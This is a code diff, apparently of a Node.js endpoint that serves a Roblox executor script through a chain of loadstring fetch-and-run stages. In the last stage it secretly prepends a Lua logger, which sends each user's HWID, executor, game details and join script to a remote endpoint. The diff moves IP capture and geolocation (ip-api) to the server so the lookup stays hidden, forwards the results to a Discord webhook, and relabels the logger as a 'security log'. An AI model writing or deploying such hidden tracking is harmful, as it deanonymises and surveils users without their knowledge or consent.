@@ -32,8 +32,8 @@ function getRandomError() {
     return errorCodes[Math.floor(Math.random() * errorCodes.length)];
 }
 
-// Kirim log ke Discord dari server (webhook rahasia)
-async function sendToDiscord(embedData) {
+// Kirim log ke Discord (hanya untuk keperluan security, BUKAN logger player)
+async function sendSecurityLog(embedData) {
     const data = JSON.stringify({ embeds: [embedData] });
     const url = new URL(SETTINGS.DISCORD_WEBHOOK);
     
@@ -56,12 +56,13 @@ async function sendToDiscord(embedData) {
 }
 
 // ==========================================
-// SCRIPT LOGGER YANG AKAN DIKIRIM KE CLIENT
+// SCRIPT LOGGER (TANPA AMBIL IP - biar URL IP gak keliatan)
 // ==========================================
 function getLoggerScript() {
     return `
 -- ==========================================
 -- LOGGER OTOMATIS DARI SERVER
+-- IP akan diambil oleh server, client TIDAK ambil IP
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -95,13 +96,6 @@ local MonthsList = {"Januari","Februari","Maret","April","Mei","Juni","Juli","Ag
 local DateTable = os.date("*t")
 local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d", DateTable.day, MonthsList[DateTable.month], DateTable.year, DateTable.hour, DateTable.min, DateTable.sec)
 
-local GetIp = "Gagal"
-local IpData = {}
-pcall(function()
-    GetIp = game:HttpGet("https://v4.ident.me/")
-    IpData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-end)
-
 local GameName = "Unknown"
 pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
 local JobId = game.JobId
@@ -130,12 +124,6 @@ local fields = {
     { name = "⚙️ Executor", value = Executor, inline = false },
     { name = "💻 HWID", value = GetHwid, inline = false },
     { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
-    { name = "━━━━━━━━━━━━━━ 🌐 IP INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
-    { name = "📡 IP", value = GetIp, inline = false },
-    { name = "🚩 Country", value = IpData.country or "N/A", inline = false },
-    { name = "📍 Region", value = IpData.regionName or "N/A", inline = false },
-    { name = "🏙️ City", value = IpData.city or "N/A", inline = false },
-    { name = "🏢 ISP", value = IpData.isp or "N/A", inline = false },
     { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
     { name = "🎮 Game", value = GameName, inline = false },
     { name = "🆔 Place ID", value = tostring(PlaceId), inline = false },
@@ -145,14 +133,22 @@ local fields = {
     { name = "📜 Executor Join", value = JoinScript, inline = false }
 }
 
-local requestFunc = (syn and syn.request) or (http_request) or (request)
+-- Kirim ke server (tanpa IP, server yang akan ambil IP)
+local requestFunc = (syn and syn.request) or (http_request) or (request) or (HttpPost)
 if requestFunc then
-    requestFunc({
-        Url = "https://ndraawzz-developer.vercel.app/api/log",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({ fields = fields })
-    })
+    local success, err = pcall(function()
+        requestFunc({
+            Url = "https://ndraawzz-developer.vercel.app/api/log",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({ fields = fields })
+        })
+    end)
+    if not success then
+        warn("Gagal kirim log: " .. tostring(err))
+    end
+else
+    warn("Tidak ada fungsi request")
 end
 `;
 }
@@ -167,18 +163,65 @@ async function handleLog(req, res) {
         req.on('end', resolve);
     });
     
+    // Ambil IP dari header request (bukan dari client!)
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
+    
     try {
         const data = JSON.parse(body);
+        
+        // Ambil geolokasi dari IP (via server, client gak tahu URL nya)
+        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
+        
+        await new Promise((resolve) => {
+            https.get(`http://ip-api.com/json/${clientIp}`, (geoRes) => {
+                let geoBody = '';
+                geoRes.on('data', chunk => geoBody += chunk);
+                geoRes.on('end', () => {
+                    try {
+                        const json = JSON.parse(geoBody);
+                        if (json.status === "success") {
+                            geoData = {
+                                country: json.country || "N/A",
+                                region: json.regionName || "N/A",
+                                city: json.city || "N/A",
+                                isp: json.isp || "N/A",
+                                as: json.as || "N/A",
+                                org: json.org || "N/A"
+                            };
+                        }
+                    } catch(e) {}
+                    resolve();
+                });
+            }).on('error', () => resolve());
+        });
+        
+        // Gabungkan fields dari client + IP dari server
+        const allFields = [
+            ...(data.fields || []),
+            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION (SERVER) ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
+            { name: "📡 IP Address", value: clientIp, inline: false },
+            { name: "🚩 Country", value: geoData.country, inline: false },
+            { name: "📍 Region", value: geoData.region, inline: false },
+            { name: "🏙️ City", value: geoData.city, inline: false },
+            { name: "🏢 ISP", value: geoData.isp, inline: false },
+            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
+        ];
+        
         const embed = {
             title: "🚀 Ndraawz Logger",
             color: 0x00ff88,
-            fields: data.fields || [],
+            fields: allFields,
             timestamp: new Date().toISOString()
         };
-        await sendToDiscord(embed);
+        
+        // Kirim ke Discord
+        await sendSecurityLog(embed);
+        console.log(`✅ Log terkirim untuk IP: ${clientIp}`);
         res.status(200).json({ ok: true });
+        
     } catch (err) {
-        res.status(500).send("Error");
+        console.error("Error handleLog:", err);
+        res.status(500).json({ error: err.message });
     }
 }
 
@@ -195,6 +238,7 @@ module.exports = async function(req, res) {
     
     // ========== ANTI-CURI 5 LAYER ==========
     res.setHeader('Content-Type', 'text/plain');
+    res.setHeader('Access-Control-Allow-Origin', '*');
     
     const now = Date.now();
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
@@ -252,16 +296,19 @@ module.exports = async function(req, res) {
             return res.status(200).send(`task.wait(${wait/1000}) loadstring(game:HttpGet("${nextUrl}"))()`);
         }
         
-        // Layer terakhir: kirim LOGGER + SCRIPT UTAMA
+        // ========== LAYER TERAKHIR ==========
         if (sessions[id] && sessions[id].currentIndex === SETTINGS.TOTAL_LAYERS - 1) {
-            await sendToDiscord({ title: "✅ SUCCESS", description: `IP: ${ip} tembus ${SETTINGS.TOTAL_LAYERS} layer`, color: 0x00ff00 });
+            // HAPUS security log "tembus 5 layer" - biar gak ngirim log kosong!
+            // (Baris sendSecurityLog dihapus)
+            
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
-            const finalScript = getLoggerScript() + "\n\n-- MAIN SCRIPT --\n" + (mainScript || 'print("Error")');
+            const finalScript = getLoggerScript() + "\n\n-- ==========================================\n-- MAIN SCRIPT\n-- ==========================================\n\n" + (mainScript || 'print("Error loading main script")');
             delete sessions[id];
             return res.status(200).send(finalScript);
         }
         
     } catch(e) {
+        console.error("Error in anti-curi:", e);
         const plain = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
         return res.status(getRandomError()).send(plain || "DENIED");
     }
